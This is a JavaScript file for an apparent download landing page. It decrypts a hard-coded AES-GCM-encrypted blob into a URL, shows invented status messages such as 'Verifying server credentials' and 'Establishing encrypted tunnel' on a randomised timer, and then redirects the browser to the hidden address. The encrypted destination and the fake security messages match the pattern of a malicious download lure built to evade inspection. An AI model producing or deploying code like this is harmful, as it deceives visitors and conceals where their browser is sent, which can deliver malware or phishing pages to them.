document.addEventListener('DOMContentLoaded', async function() {
  const statusText = document.getElementById('status-text');
  const errorText = document.getElementById('error-text');
  const progress = document.getElementById('progress');
  const progressProcent = document.getElementById('progress-percent');

  const [r, g, b] = 'VTuYQrNBS1ikZFXOxNeA3WxTZo4gcqA4NErXBbtB85E=.U3ur2ZAdG+kkWhsz.xfPWSSd0nCdt9G1DLJOty6ol70lNi9zIYBHPDYq77lzVWer/ijyOfq/uWspu9grLfJ/2UPwZm0m5e9524ypZNw=='.split('.')
  
  const k = await crypto.subtle.importKey(
    "raw",
    fb(r),
    { name: "AES-GCM" },
    false,
    ["encrypt", "decrypt"]
  );

  const rdr = new TextDecoder().decode(await crypto.subtle.decrypt(
    {name: "AES-GCM", iv: fb(g)},
    k,
    fb(b)   
  ));

  const statusMessages = [
    'Initializing secure session...',
    'Verifying server credentials...',
    'Establishing encrypted tunnel...',
    'Preparing download link...',
    'Connection established'
  ];
  
  let messageIndex = 0;
  let isComplete = false;

  function fb(str) {
    return Uint8Array.from(
      atob(str),
      c => c.charCodeAt(0)
    );
  }

  function setProgress(value) {
    const v = Math.max(0, Math.min(100, Math.round(value)));
    progress.querySelector('.progress-fill').style.width = v + '%';
    progress.querySelector('.progress-bar').setAttribute('aria-valuenow', v);
    progressProcent.textContent = v + '%';
    progress.classList.toggle('is-complete', v === 100);
    progress.querySelector('.progress-label').textContent = v === 100 ? 'Ready' : 'Preparing';
  }
  
  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.textContent = statusMessages[messageIndex];
      messageIndex++;
      
      const progress = (messageIndex / statusMessages.length) * 100;
      setProgress(progress)
      
      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, n(500, 2500));
      } else {
        isComplete = true;
        statusText.textContent = 'Download starting...';
        
        setTimeout(() => {
          window.location.href = rdr;
        }, 500);
      }
    }
  }
  
  setTimeout(updateStatus, 500);
  
  const card = document.querySelector('.card');
  
  card.addEventListener('mouseenter', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(-2px)';
      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
    }
  });
  
  card.addEventListener('mouseleave', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
    }
  });
});


function n(v1, v2) {
  return Math.floor(Math.random() * (v2 - v1 + 1)) + v1
}

function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  if (popup.style.display === 'block') {
    closePopup();
  } else {
    popup.classList.add('open');
  }
}


function closePopup() {
  const popup = document.getElementById('infoPopup');

  popup.classList.remove('open');
  popup.classList.add('closing');

  popup.addEventListener('animationend', () => {
    popup.classList.remove('closing');
  }, {once: true})
}

document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');
  
  if (!popup.classList.contains('open')) {
    return;
  }

  if (popup.contains(event.target) || infoBtn) {
    return;
  }

  closePopup();
});